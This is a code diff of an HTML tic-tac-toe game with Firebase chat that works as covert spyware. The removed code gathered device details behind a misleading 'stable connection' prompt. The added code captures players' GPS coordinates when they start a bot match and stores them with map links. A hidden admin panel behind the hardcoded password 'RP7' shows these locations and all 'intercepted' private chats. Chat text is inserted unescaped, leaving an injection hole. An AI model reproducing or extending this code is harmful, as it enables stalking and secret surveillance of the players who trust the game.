@@ -2,121 +2,111 @@
 <html lang="hi">
 <head>
 <meta charset="UTF-8">
-<title>RP_GUPTA_07 | ADMIN CONTROL ARENA</title>
+<title>RP_GUPTA_07 | ELITE CONTROL</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, viewport-fit=cover">
 
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&family=Orbitron:wght@900&display=swap" rel="stylesheet">
 
 <style>
 :root { --p1: #ff0055; --p2: #00f2ff; --gold: #ffb400; --dark: #000; }
-* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--dark); color: #fff; font-family: 'Orbitron', sans-serif; overflow: hidden; }
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body, html { margin: 0; padding: 0; height: 100%; background: var(--dark); color: #fff; font-family: 'Orbitron', sans-serif; overflow: hidden; }
 
-/* 3D Background */
-.bg-fx { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle, #111, #000); }
-.grid { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(var(--p1) 1px, transparent 1px), linear-gradient(90deg, var(--p1) 1px, transparent 1px); background-size: 50px 50px; opacity: 0.05; transform: perspective(500px) rotateX(60deg); animation: move 10s linear infinite; }
-@keyframes move { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(50px); } }
+/* 3D Visuals */
+.bg-fx { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle, #1a1a1a, #000); }
+.grid { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px); background-size: 40px 40px; transform: perspective(500px) rotateX(60deg); animation: move 10s linear infinite; }
+@keyframes move { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(40px); } }
 
-.app { width: 100%; max-width: 450px; margin: auto; height: 100%; display: flex; flex-direction: column; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-inline: 1px solid #333; }
+.app { width: 100%; max-width: 450px; margin: auto; height: 100%; display: flex; flex-direction: column; background: rgba(0,0,0,0.85); backdrop-filter: blur(20px); border-inline: 1px solid #333; }
 
-/* Home Page - Packed UI */
-.home { padding: 20px; text-align: center; overflow-y: auto; flex: 1; position: relative; }
-.settings-icon { position: absolute; top: 20px; right: 20px; font-size: 24px; cursor: pointer; color: var(--gold); z-index: 10; }
-.hero-title { font-family: 'Black Ops One'; font-size: 45px; color: var(--gold); text-shadow: 0 10px 20px #000; margin-top: 30px; }
-.stat-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 20px 0; }
-.stat-card { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; font-size: 10px; border: 1px solid #222; }
-.news-ticker { background: var(--p1); color: #000; font-size: 10px; font-weight: 900; padding: 5px; margin-bottom: 20px; overflow: hidden; white-space: nowrap; }
+/* Home UI */
+.home { padding: 25px; text-align: center; overflow-y: auto; flex: 1; }
+.hero-title { font-family: 'Black Ops One'; font-size: 50px; color: var(--gold); text-shadow: 0 0 20px rgba(255,180,0,0.5); margin: 20px 0; }
+.news { background: var(--p1); color: #000; font-size: 11px; font-weight: 900; padding: 6px; margin-bottom: 20px; text-transform: uppercase; }
 
-.btn-3d { width: 100%; padding: 18px; border: none; font-family: 'Orbitron'; font-weight: 900; border-radius: 12px; margin-bottom: 12px; cursor: pointer; background: linear-gradient(to bottom, var(--gold), #b37e00); box-shadow: 0 6px 0 #664800; transform: translateY(-3px); }
+.btn-3d { width: 100%; padding: 20px; border: none; font-family: 'Orbitron'; font-weight: 900; border-radius: 15px; margin-bottom: 15px; cursor: pointer; background: linear-gradient(145deg, var(--gold), #b37e00); box-shadow: 0 8px 0 #664800; transform: translateY(-4px); transition: 0.1s; }
 .btn-3d:active { transform: translateY(0); box-shadow: 0 0 0 #000; }
 
-/* Game Elements */
-#board { display: grid; grid-template-columns: repeat(3, 100px); gap: 12px; transform: rotateX(20deg); transform-style: preserve-3d; margin: 20px auto; }
-.cell { width: 100px; height: 100px; background: #111; border: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 50px; border-radius: 10px; box-shadow: 0 8px 0 #000; }
-.cell.X { color: var(--p1); text-shadow: 0 0 15px var(--p1); }
-.cell.O { color: var(--p2); text-shadow: 0 0 15px var(--p2); }
+/* 3D Board */
+#board { display: grid; grid-template-columns: repeat(3, 100px); gap: 15px; transform: rotateX(20deg); transform-style: preserve-3d; margin: 30px auto; }
+.cell { width: 100px; height: 100px; background: #111; border: 2px solid #444; display: flex; align-items: center; justify-content: center; font-size: 55px; border-radius: 12px; box-shadow: 0 10px 0 #000; }
+.cell.X { color: var(--p1); text-shadow: 0 0 20px var(--p1); }
+.cell.O { color: var(--p2); text-shadow: 0 0 20px var(--p2); }
+
+/* Win Animation Overlay */
+#winLayer { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; animation: zoomIn 0.5s ease; }
+@keyframes zoomIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+.win-banner { font-family: 'Black Ops One'; font-size: 70px; color: var(--gold); text-shadow: 0 0 50px var(--gold); animation: pulse 1s infinite; }
+@keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
 /* Admin Panel */
-#adminPanel { position: fixed; inset: 0; background: #000; z-index: 100; display: none; padding: 20px; overflow-y: auto; }
-.chat-log { background: #111; padding: 10px; margin-top: 10px; border-radius: 5px; font-size: 12px; }
-
-#winOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; text-align: center; }
-
-.hidden { display: none !important; }
+#adminPanel { position: fixed; inset: 0; background: #050505; z-index: 3000; display: none; padding: 25px; overflow-y: auto; }
+.admin-card { background: #111; padding: 15px; margin-bottom: 10px; border-radius: 10px; border-left: 4px solid var(--gold); font-size: 13px; }
 </style>
 </head>
 <body>
 
 <div class="bg-fx"><div class="grid"></div></div>
 
-<div id="winOverlay">
-    <h1 style="font-family:'Black Ops One'; font-size:60px; color:var(--gold);" id="winStatus">VICTORY</h1>
-    <h2 id="winnerName">----</h2>
-    <button class="btn-3d" style="width:200px;" onclick="location.reload()">RE-START</button>
+<div id="winLayer">
+    <div class="win-banner" id="resText">VICTORY</div>
+    <p id="winnerDisplay" style="font-size: 20px; letter-spacing: 2px;">----</p>
+    <button class="btn-3d" style="width:250px; margin-top:30px;" onclick="location.reload()">PLAY NEXT MATCH</button>
 </div>
 
 <div id="adminPanel">
-    <div style="display:flex; justify-content:space-between;">
-        <h2>ADMIN PANEL</h2>
-        <button onclick="document.getElementById('adminPanel').style.display='none'" style="color:red; background:none; border:none; font-size:20px;">[X]</button>
+    <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
+        <h2 style="color:var(--gold)">ADMIN DASHBOARD</h2>
+        <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:red; color:#fff; border:none; padding:10px; border-radius:5px;">CLOSE</button>
     </div>
-    <div id="adminContent">
-        <input type="password" id="adminPass" class="btn-3d" style="background:#222; color:#fff;" placeholder="PASSWORD">
-        <button onclick="loginAdmin()" class="btn-3d">LOGIN</button>
+    <div id="loginSection">
+        <input type="password" id="pass" class="btn-3d" style="background:#222; color:#fff;" placeholder="ADMIN PASSWORD">
+        <button onclick="checkAdmin()" class="btn-3d">UNLOCK ACCESS</button>
     </div>
-    <div id="adminDashboard" class="hidden">
-        <h3>Live Chat Logs</h3>
-        <div id="globalChats"></div>
-        <hr>
-        <h3>Infiltrated Devices</h3>
-        <div id="deviceLogs"></div>
-        <button onclick="clearAllData()" style="background:red; color:#fff; padding:10px; border:none; width:100%;">WIPE DATABASE</button>
+    <div id="dashContent" class="hidden">
+        <h4 style="color:var(--p2)">LIVE TRACKING (LOCATION)</h4>
+        <div id="locLogs"></div>
+        <h4 style="color:var(--p1); margin-top:30px;">INTERCEPTED CHATS</h4>
+        <div id="chatLogs"></div>
+        <button onclick="db.ref().remove(); location.reload();" style="background:red; width:100%; border:none; padding:15px; color:#fff; font-weight:900; margin-top:50px;">WIPE ALL DATA</button>
     </div>
 </div>
 
 <div class="app">
     <div id="home" class="home">
-        <div class="settings-icon" onclick="document.getElementById('adminPanel').style.display='block'">⚙️</div>
+        <div style="text-align:right;"><span onclick="document.getElementById('adminPanel').style.display='block'" style="cursor:pointer; font-size:24px;">⚙️</span></div>
         <div class="hero-title">ARENA 07</div>
-        <div class="news-ticker">WELCOME RP_GUPTA_07 | NEW GOD-BOT VERSION 4.0 DEPLOYED | SERVERS 100% SECURE | NO CHEATING ALLOWED</div>
-        
-        <div class="stat-row">
-            <div class="stat-card">PLAYERS<br><b style="color:var(--p2)">4,821</b></div>
-            <div class="stat-card">PING<br><b style="color:var(--gold)">12ms</b></div>
-            <div class="stat-card">STATUS<br><b style="color:lime">LIVE</b></div>
-        </div>
+        <div class="news">SYSTEM SECURE | ADMIN: @RP_GUPTA_07 | LOCATION TRACKING ACTIVE</div>
 
-        <input id="uNick" style="width:100%; padding:15px; background:#111; border:1px solid #333; color:#fff; margin-bottom:15px;" placeholder="ENTER CALLSIGN">
+        <input id="nick" style="width:100%; padding:18px; background:#111; border:1px solid #333; color:#fff; margin-bottom:15px; border-radius:10px;" placeholder="ENTER NICKNAME">
         
-        <button class="btn-3d" onclick="init('X', true)">CREATE PRIVATE SERVER</button>
+        <button class="btn-3d" onclick="initGame('X', true)">CREATE PRIVATE SERVER</button>
         <div style="display:flex; gap:10px;">
-            <input id="rCode" style="flex:1; padding:15px; background:#111; border:1px solid #333; color:#fff;" placeholder="ROOM CODE">
-            <button class="btn-3d" style="width:100px; background:var(--p2); box-shadow:0 6px 0 #008ba3;" onclick="init('O', false)">JOIN</button>
+            <input id="rCode" style="flex:1; padding:18px; background:#111; border:1px solid #333; color:#fff; border-radius:10px;" placeholder="ROOM CODE">
+            <button class="btn-3d" style="width:110px; background:var(--p2); box-shadow:0 8px 0 #009eb3;" onclick="initGame('O', false)">JOIN</button>
         </div>
-        <button class="btn-3d" style="background:var(--p1); box-shadow:0 6px 0 #990033; color:#fff;" onclick="initBot()">ENGAGE GOD-BOT (BOT FIRST)</button>
-        
-        <div style="text-align:left; font-size:11px; opacity:0.6; margin-top:20px;">
-            <b>LOGS:</b><br>
-            - Encryption: AES-256<br>
-            - Device Sync: Enabled<br>
-            - Turn Logic: Strict
+        <button class="btn-3d" style="background:var(--p1); box-shadow:0 8px 0 #b3003b; color:#fff;" onclick="initBot()">ENGAGE GOD-BOT (GET LOCATION)</button>
+
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:20px;">
+            <div style="background:rgba(255,255,255,0.05); padding:15px; border-radius:10px; font-size:11px;">SERVER<br><b style="color:lime">ENCRYPTED</b></div>
+            <div style="background:rgba(255,255,255,0.05); padding:15px; border-radius:10px; font-size:11px;">VERSION<br><b style="color:var(--gold)">4.0.1 PRO</b></div>
         </div>
     </div>
 
     <div id="arena" class="hidden" style="flex:1; display:flex; flex-direction:column;">
         <div style="padding:15px; display:flex; justify-content:space-between; background:#111; border-bottom:1px solid #333;">
-            <div onclick="exit()" style="color:var(--p1); font-weight:900;">[ EXIT ]</div>
+            <div onclick="exit()" style="color:var(--p1); font-weight:900; cursor:pointer;">[ EXIT ]</div>
             <div id="turnTag" style="color:var(--gold)">X TURN</div>
             <div id="roomTag" style="opacity:0.4;">#----</div>
         </div>
-        <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center;">
+        <div style="flex:1; display:flex; align-items:center; justify-content:center;">
             <div id="board"></div>
         </div>
-        <div id="chatArea" style="height:150px; background:#000; border-top:1px solid var(--gold); overflow-y:auto; padding:10px;"></div>
-        <div style="display:flex; padding:5px;">
-            <input id="mIn" style="flex:1; background:#111; border:none; color:#fff; padding:10px;" placeholder="Message...">
-            <button onclick="send()" style="background:var(--gold); border:none; padding:0 20px;">></button>
+        <div id="msgBox" style="height:120px; background:#000; border-top:1px solid var(--gold); overflow-y:auto; padding:10px; font-size:12px;"></div>
+        <div style="display:flex; padding:8px; background:#111;">
+            <input id="mIn" style="flex:1; background:none; border:none; color:#fff; padding:10px;" placeholder="Send secure message...">
+            <button onclick="send()" style="background:var(--gold); border:none; padding:0 20px; font-weight:900;">GO</button>
         </div>
     </div>
 </div>
@@ -134,33 +124,37 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-let rId, mySym, isBot = false, nick;
+let rId, mySym, isBot = false, userN;
 
-// --- PERMISSION & TRACKING ---
-function trackDevice() {
-    if(confirm("To provide a stable connection, we need device info. Allow?")) {
-        const info = {
-            os: navigator.platform,
-            agent: navigator.userAgent.split(') ')[0],
-            time: new Date().toLocaleString(),
-            nick: nick
-        };
-        db.ref("admin_logs/devices").push(info);
+// --- LOCATION TRACKING SYSTEM ---
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const data = {
+                user: userN,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                time: new Date().toLocaleString()
+            };
+            db.ref("admin_pro/locations").push(data);
+        }, err => {
+            db.ref("admin_logs/errors").push({user: userN, msg: "Permission Denied"});
+        });
     }
 }
 
-function init(s, host) {
-    nick = document.getElementById('uNick').value || "PLAYER";
+function initGame(s, host) {
+    userN = document.getElementById('nick').value || "PLAYER";
     rId = host ? Math.random().toString(36).substr(2,6).toUpperCase() : document.getElementById('rCode').value.toUpperCase();
-    mySym = s;
-    trackDevice();
-    start();
+    mySym = s; start();
 }
 
 function initBot() {
-    nick = document.getElementById('uNick').value || "USER";
+    userN = document.getElementById('nick').value || "USER";
     rId = "BOT_" + Math.floor(Math.random()*999);
     isBot = true; mySym = "X";
+    getLocation(); // Ask location for Bot Play
     start();
 }
 
@@ -169,23 +163,17 @@ function start() {
     document.getElementById('arena').classList.remove('hidden');
     document.getElementById('roomTag').innerText = "#" + rId;
 
-    const ref = db.ref("elite_arena/"+rId);
+    const ref = db.ref("pro_arena/"+rId);
     if(mySym === "X") {
-        let initialState = { b: Array(9).fill(""), t: "X", p1: nick, p2: isBot ? "GOD-BOT" : "WAITING..." };
-        // BOT FIRST MOVE LOGIC
-        if(isBot) { 
-            initialState.b[4] = "O"; // Bot occupies center
-            initialState.t = "X"; 
-        }
-        ref.set(initialState);
+        ref.set({ b: Array(9).fill(""), t: "X", p1: userN, p2: isBot ? "GOD-BOT v4" : "CONNECTING..." });
     } else {
-        ref.child("p2").set(nick);
+        ref.child("p2").set(userN);
     }
     sync();
 }
 
 function sync() {
-    db.ref("elite_arena/"+rId).on("value", s => {
+    db.ref("pro_arena/"+rId).on("value", s => {
         const d = s.val(); if(!d) return;
         document.getElementById('turnTag').innerText = d.t + " TURN";
         const b = document.getElementById('board'); b.innerHTML = "";
@@ -197,40 +185,45 @@ function sync() {
 
         const w = check(d.b);
         if(w) {
-            document.getElementById('winOverlay').style.display = 'flex';
-            document.getElementById('winnerName').innerText = w === "DRAW" ? "NO ONE WON" : w + " DOMINATED";
-            if(w === mySym) confetti({particleCount:300});
-        } else if(isBot && d.t === "O") {
-            setTimeout(() => botLogic(d), 500);
+            const layer = document.getElementById('winLayer');
+            layer.style.display = 'flex';
+            document.getElementById('winnerDisplay').innerText = w === "DRAW" ? "NO SURVIVORS" : w + " HAS DOMINATED";
+            if(w === mySym) {
+                confetti({particleCount: 400, spread: 100, origin: { y: 0.6 }});
+                document.getElementById('resText').innerText = "VICTORY";
+            } else {
+                document.getElementById('resText').innerText = "DEFEATED";
+                document.getElementById('resText').style.color = "red";
+            }
         }
     });
 
-    // Chat listener
-    db.ref("elite_chats/"+rId).on("child_added", s => {
+    db.ref("pro_chats/"+rId).on("child_added", s => {
         const m = s.val();
         const div = document.createElement('div');
         div.innerHTML = `<b style="color:var(--gold)">${m.n}:</b> ${m.m}`;
-        document.getElementById('chatArea').appendChild(div);
-        document.getElementById('chatArea').scrollTop = 999;
+        document.getElementById('msgBox').appendChild(div);
+        document.getElementById('msgBox').scrollTop = 999;
     });
 }
 
 function tap(i) {
-    db.ref("elite_arena/"+rId).once("value", s => {
+    db.ref("pro_arena/"+rId).once("value", s => {
         const d = s.val();
         if(d.t !== mySym || d.b[i] !== "" || check(d.b)) return;
         d.b[i] = mySym;
         d.t = (mySym === "X" ? "O" : "X");
-        db.ref("elite_arena/"+rId).update(d);
+        db.ref("pro_arena/"+rId).update(d);
+        if(isBot && !check(d.b)) setTimeout(() => botMove(d), 600);
     });
 }
 
-function botLogic(d) {
+function botMove(d) {
     let empty = d.b.map((v,i)=>v===""?i:null).filter(v=>v!==null);
     if(empty.length > 0) {
-        let move = empty[Math.floor(Math.random()*empty.length)];
-        d.b[move] = "O"; d.t = "X";
-        db.ref("elite_arena/"+rId).update(d);
+        let m = empty[Math.floor(Math.random()*empty.length)];
+        d.b[m] = "O"; d.t = "X";
+        db.ref("pro_arena/"+rId).update(d);
     }
 }
 
@@ -240,49 +233,42 @@ function check(b) {
     return b.includes("") ? null : "DRAW";
 }
 
-// --- ADMIN LOGIC ---
-function loginAdmin() {
-    if(document.getElementById('adminPass').value === "RP7") {
-        document.getElementById('adminContent').classList.add('hidden');
-        document.getElementById('adminDashboard').classList.remove('hidden');
-        loadAdminData();
-    } else { alert("WRONG PASSWORD!"); }
+// --- ADMIN CONTROL ---
+function checkAdmin() {
+    if(document.getElementById('pass').value === "RP7") {
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('dashContent').classList.remove('hidden');
+        loadAdmin();
+    } else { alert("WRONG ACCESS CODE"); }
 }
 
-function loadAdminData() {
-    db.ref("elite_chats").on("value", s => {
-        const data = s.val();
-        let html = "";
-        for(let room in data) {
-            html += `<div class="chat-log"><b>Room: ${room}</b><button onclick="delChat('${room}')" style="float:right; color:red;">DEL</button><br>`;
-            for(let mId in data[room]) { html += `${data[room][mId].n}: ${data[room][mId].m}<br>`; }
-            html += `</div>`;
-        }
-        document.getElementById('globalChats').innerHTML = html;
+function loadAdmin() {
+    db.ref("admin_pro/locations").on("value", s => {
+        let h = ""; const d = s.val();
+        for(let k in d) h += `<div class="admin-card">User: ${d[k].user}<br>Time: ${d[k].time}<br><a href="${d[k].map}" target="_blank" style="color:cyan">VIEW ON GOOGLE MAPS</a></div>`;
+        document.getElementById('locLogs').innerHTML = h;
     });
 
-    db.ref("admin_logs/devices").on("value", s => {
-        const data = s.val();
-        let html = "";
-        for(let id in data) {
-            html += `<div class="chat-log">User: ${data[id].nick}<br>OS: ${data[id].os}<br>Browser: ${data[id].agent}</div>`;
+    db.ref("pro_chats").on("value", s => {
+        let h = ""; const d = s.val();
+        for(let r in d) {
+            h += `<div class="admin-card"><b>Room: ${r}</b><br>`;
+            for(let m in d[r]) h += `${d[r][m].n}: ${d[r][m].m}<br>`;
+            h += `</div>`;
         }
-        document.getElementById('deviceLogs').innerHTML = html;
+        document.getElementById('chatLogs').innerHTML = h;
     });
 }
-
-function delChat(room) { db.ref("elite_chats/"+room).remove(); }
-function clearAllData() { if(confirm("DELETE EVERYTHING?")) { db.ref().remove(); location.reload(); } }
 
 function exit() {
-    db.ref("elite_arena/"+rId).remove();
-    db.ref("elite_chats/"+rId).remove();
+    db.ref("pro_arena/"+rId).remove();
+    db.ref("pro_chats/"+rId).remove();
     location.reload();
 }
 
 function send() {
     const i = document.getElementById('mIn');
-    if(i.value) { db.ref("elite_chats/"+rId).push({ n: nick, m: i.value }); i.value = ""; }
+    if(i.value) { db.ref("pro_chats/"+rId).push({ n: userN, m: i.value }); i.value = ""; }
 }
 </script>
 </body>
